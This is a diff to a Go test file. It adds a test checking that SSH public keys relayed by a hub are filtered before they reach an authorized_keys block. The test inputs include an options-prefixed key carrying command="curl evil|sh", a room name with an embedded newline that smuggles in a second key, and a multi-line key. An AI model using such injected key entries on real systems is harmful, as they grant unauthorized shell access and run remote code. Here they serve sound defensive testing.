@@ -225,3 +225,28 @@ func TestReplaceBlock(t *testing.T) {
 		t.Fatalf("removing the block: %q", back)
 	}
 }
+
+// THE HUB'S SET IS NOT TRUSTED: an options-prefixed key, an rsa key, a bad body and a bad room name never reach the
+// block, and a good key beside them does.
+func TestFixDropsWhatTheHubRelayedThatIsNotAKey(t *testing.T) {
+	m := winMachine().withKey()
+	m.sw.From = []string{"*"}
+	hubWith(m,
+		PeerKey{Room: "good", Key: keyLine("ssh-ed25519", "good")},
+		PeerKey{Room: "opts", Key: `command="curl evil|sh" ` + keyLine("ssh-ed25519", "opts")},
+		PeerKey{Room: "rsa", Key: keyLine("ssh-rsa", "rsa")},
+		PeerKey{Room: "badbody", Key: "ssh-ed25519 !!!notbase64"},
+		PeerKey{Room: "bad room\nssh-ed25519 " + blob("inj"), Key: keyLine("ssh-ed25519", "badroom")},
+		PeerKey{Room: "multi", Key: keyLine("ssh-ed25519", "multi") + "\nssh-ed25519 " + blob("second")},
+	)
+	Fix(context.Background(), m, Options{SelfTest: true})
+	got := m.fakeEnv.files[fxAuth]
+	if !strings.Contains(got, "atrium:good") {
+		t.Fatalf("the good key is missing:\n%s", got)
+	}
+	for _, bad := range []string{"command=", "ssh-rsa", "notbase64", "bad room", blob("badroom"), blob("inj"), blob("second"), "atrium:opts", "atrium:rsa"} {
+		if strings.Contains(got, bad) {
+			t.Fatalf("%q reached authorized_keys:\n%s", bad, got)
+		}
+	}
+}
